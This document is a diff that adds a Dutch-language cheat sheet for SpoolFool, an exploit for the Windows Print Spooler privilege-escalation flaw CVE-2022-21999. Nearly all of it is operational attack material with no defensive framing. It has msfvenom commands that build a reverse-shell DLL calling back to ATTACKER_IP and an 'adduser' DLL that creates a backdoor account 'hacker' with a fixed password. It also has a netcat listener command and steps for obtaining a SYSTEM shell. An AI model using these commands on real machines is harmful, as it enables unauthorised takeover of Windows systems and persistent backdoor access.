@@ -1,0 +1,40 @@
+# SpoolFool — Windows Print Spooler LPE (CVE-2022-21999)
+# Exploiteert directory creation kwetsbaarheid in Print Spooler om DLL als SYSTEM te laden
+#
+# === Syntax ===
+# SpoolFool.exe [opties]
+#
+# === Belangrijkste opties ===
+# -dll <path>       DLL om te laden als SYSTEM (vereist)
+#
+# === Vereisten ===
+# Lokale gebruiker (geen admin vereist)
+# Print Spooler service moet draaien (standaard aan)
+# Kwetsbaar: Windows ongepatcht voor CVE-2022-21999 (feb 2022 patch)
+# Controleer: sc query Spooler
+#
+# === Voorbeelden ===
+
+# Controleer of Print Spooler draait
+sc query Spooler
+
+# Maak payload DLL (op aanvaller machine met msfvenom)
+# msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f dll -o payload.dll
+
+# Exploit uitvoeren met payload DLL
+SpoolFool.exe -dll payload.dll
+
+# Stappen:
+# 1. Genereer DLL payload op ATTACKER_IP
+# 2. Upload payload.dll naar target
+# 3. Start listener: nc -nlvp 443
+# 4. Voer SpoolFool.exe -dll payload.dll uit
+# 5. Ontvang SYSTEM shell
+
+# Add-user DLL (als je geen reverse shell wilt)
+# msfvenom -p windows/adduser USER=hacker PASS=P@ssw0rd123 -f dll -o adduser.dll
+SpoolFool.exe -dll adduser.dll
+
+# NOTE: Vereist dat het systeem NIET gepatcht is voor CVE-2022-21999
+# NOTE: Print Spooler is standaard actief op de meeste Windows systemen
+# NOTE: Na de exploit wordt de DLL geladen door spoolsv.exe (SYSTEM context)
